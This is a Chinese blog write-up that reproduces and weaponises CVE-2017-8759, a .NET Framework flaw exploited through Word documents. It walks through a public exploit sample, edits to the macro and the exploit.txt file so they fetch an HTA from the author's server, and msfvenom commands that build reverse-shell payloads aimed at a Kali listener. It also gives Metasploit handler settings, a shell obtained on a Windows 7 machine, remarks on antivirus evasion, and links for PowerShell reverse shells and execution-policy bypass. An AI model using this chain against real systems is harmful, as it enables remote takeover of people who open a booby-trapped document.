# CVE-2017-8759 微软 word 漏洞复现以及利用 - _Deen - 博客园

> 原文：[`www.cnblogs.com/deen-/p/7532078.html`](https://www.cnblogs.com/deen-/p/7532078.html)

# CVE-2017-8759 微软 word 漏洞复现以及利用

## 0x00 漏洞描述

> 近日，360 集团核心安全事业部分析团队发现一个新型的 Office 文档高级威胁攻击，攻击使用了 9 月 12 日补丁刚修复的.NET Framework 漏洞，该漏洞在野外被利用时为 0day 状态，用户打开恶意的 Office 文档就会中招。该漏洞的技术原理和今年黑客“奥斯卡”Pwnie Awards 上的最佳客户端漏洞（CVE-2017-0199）如出一辙，不同的是，这次黑客在 Offcie 文档中嵌入新的 Moniker 对象，利用的是.net 库漏洞，在 Office 文档中加载执行远程的恶意.NET 代码，而整个漏洞的罪魁祸首竞是.NET Framework 一个换行符处理失误。

影响范围：

> Microsoft .NET Framework 4.6.2
> Microsoft .NET Framework 4.6.1
> Microsoft .NET Framework 3.5.1
> Microsoft .NET Framework 4.7
> Microsoft .NET Framework 4.6
> Microsoft .NET Framework 4.5.2
> Microsoft .NET Framework 3.5
> Microsoft .NET Framework 2.0 SP2

## 0x01 验证漏洞

exploit-sample 地址：[`github.com/Voulnet/CVE-2017-8759-Exploit-sample`](https://github.com/Voulnet/CVE-2017-8759-Exploit-sample)

将文件下载下来，打开所在的文件夹，在当前文件夹创建一个命令行，运行：
`python -m SimpleHTTPServer 8080`

这个时候我们已经在本地的 8080 端口创建了一个服务器了

![](img/4c486cf2205c551c945f4afb5826d2a4.png)

然后打开 doc 文件，启用编辑，就会弹出画图工具，漏洞验证成功

![](img/0a7cc37f8f95e056da70c9a1ee49f23b.png)

## 0x02 漏洞利用

环境说明：

*   ip： 120.27.32.227 这是我在公网的主机
*   ip： 192.168.242.137 虚拟机的 kali
*   靶机： windows7 我的实体机，虚拟机没有装了 office 的

### 1\. 分析流程

**word 的宏**

![](img/6163ddcb15b2bb94199be84096b198ec.png)

![](img/4939de00903b9625b1f9a73529e9e94d.png)

**exploit.txt 文件**

![](img/1c725434b4ccb199437ad1e33fea311b.png)

**cmd.hta 文件**

![](img/2b54d5955be21cfc389bfc2d05284a43.png)

所以流程是：

word 宏 ==》 exploit.txt ==》 cmd.hta

### 2\. 修改利用

1.  我将 exploit.txt 修改成如下然后上传到我自己的服务器 120.27.32.227

![](img/10a24e91a9112ecb08022602561d55cd.png)

访问文件

![](img/87b98333b04bf86f4d9b94a76640b0dd.png)

**fn.hta 是我用 msfvenom 生成的，具体命令如下**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.242.137 LPORT=7777 -f hta-psh -o /var/fn.hta 
```

或者

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.242.137 LPORT=7777 -f hta-psh -o /var/fn.hta 
```

2.  修改宏

![](img/66356c353faf287e1a20c3dee16879f0.png)

3.  然后上传 fn.hta 到服务器 120.27.32.227

### 3.验证

虚拟机 kali(192.168.242.137)启动 metasploit

```
use exploit/multi/handler 

set PAYLOAD windows/x64/shell/reverse_tcp

set LHOST 192.168.242.137

set LPORT 7777

exploit 
```

![](img/bd70931b2f0a6fab43beb01fda09c73b.png)

修改过宏的文档在 win7 打开，反弹回来一个 shell

![](img/1557c30228c16b5ec683dbc9631047f9.png)

打开 word 文档的这个过程，360 会进行提示但不是报毒，最后还会留下这么一个窗口

![](img/dcbec5e23861808b0705396f156e6a50.png)

至此，漏洞验证到利用结束

## 0x03 漏洞利用思路

*   可以利用 powershell 进行注入反弹，gitHub 地址：[`github.com/besimorhino/powercat`](https://github.com/besimorhino/powercat)
*   也可以利用 hta 文件

这两者利用参考文章 freebuf 有：[`www.freebuf.com/sectool/90362.html`](http://www.freebuf.com/sectool/90362.html)

最后，参考文档：

*   漏洞预警：[`bobao.360.cn/learning/detail/4416.html`](http://bobao.360.cn/learning/detail/4416.html)
*   powershell 反弹 shell: [`www.secpulse.com/archives/32096.html`](https://www.secpulse.com/archives/32096.html)
*   powersehll 注入技巧：[`bobao.360.cn/learning/detail/3808.html`](http://bobao.360.cn/learning/detail/3808.html)
*   绕过 PowerShell Execution Policy：[`www.freebuf.com/articles/system/93829.html`](http://www.freebuf.com/articles/system/93829.html)